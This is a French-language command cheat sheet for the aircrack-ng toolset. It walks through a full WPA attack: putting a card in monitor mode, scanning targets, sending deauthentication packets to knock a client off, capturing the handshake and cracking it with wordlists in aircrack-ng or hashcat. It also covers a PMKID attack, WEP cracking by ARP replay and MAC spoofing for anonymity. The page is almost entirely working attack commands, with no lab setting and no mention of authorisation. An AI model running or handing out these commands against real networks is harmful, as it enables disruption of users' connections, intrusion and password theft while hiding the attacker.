📦 Installation

Installation
# Kali Linux (préinstallé)
aircrack-ng --version

# Debian/Ubuntu
sudo apt install aircrack-ng

# Outils de la suite
airmon-ng   — Mode monitor
airodump-ng — Capture paquets
aireplay-ng — Injection de paquets
aircrack-ng — Cracking WEP/WPA
airdecap-ng — Déchiffrer les captures
airbase-ng  — Faux AP

📋 Workflow WPA Handshake

Étape 1 — Mode Monitor
# Lister les interfaces WiFi
iwconfig
ip link show

# Activer le mode monitor
sudo airmon-ng start wlan0
# L'interface devient wlan0mon

# Tuer les processus qui interfèrent
sudo airmon-ng check kill

# Vérifier le mode monitor
iwconfig wlan0mon
Étape 2 — Scanner les réseaux
# Scanner tous les réseaux environnants
sudo airodump-ng wlan0mon

# Filtrer sur un canal et BSSID spécifique
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c = canal, --bssid = MAC du routeur, -w = fichier de sortie
Étape 3 — Capturer le handshake WPA
# Dans un autre terminal — déauthentifier un client (force reconnexion)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -a = BSSID routeur, -c = MAC client connecté, 10 = nombre de paquets

# Attendre le message "WPA handshake: AA:BB:CC:DD:EE:FF" dans airodump-ng

# Vérifier que le handshake est valide
aircrack-ng capture-01.cap
Étape 4 — Cracker le mot de passe
# Avec aircrack-ng (CPU)
aircrack-ng -a 2 -b AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Convertir pour Hashcat (GPU — beaucoup plus rapide)
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Alternative ancienne format
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 -a 0 capture.hccapx rockyou.txt

# Désactiver le mode monitor
sudo airmon-ng stop wlan0mon

🔧 Attaques supplémentaires

PMKID Attack & Evil Twin
# PMKID Attack (sans handshake complet)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool pmkid.pcapng -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt

# WEP cracking (réseau très ancien)
# Capturer des IVs
airodump-ng -c 6 --bssid BSSID -w wep_capture wlan0mon
# Injection ARP replay
aireplay-ng --arpreplay -b BSSID wlan0mon
# Cracker (besoin de ~100000 IVs)
aircrack-ng wep_capture-01.cap

# Changer la MAC address (anonymat)
sudo ip link set wlan0 down
sudo macchanger -r wlan0   # MAC aléatoire
sudo ip link set wlan0 up
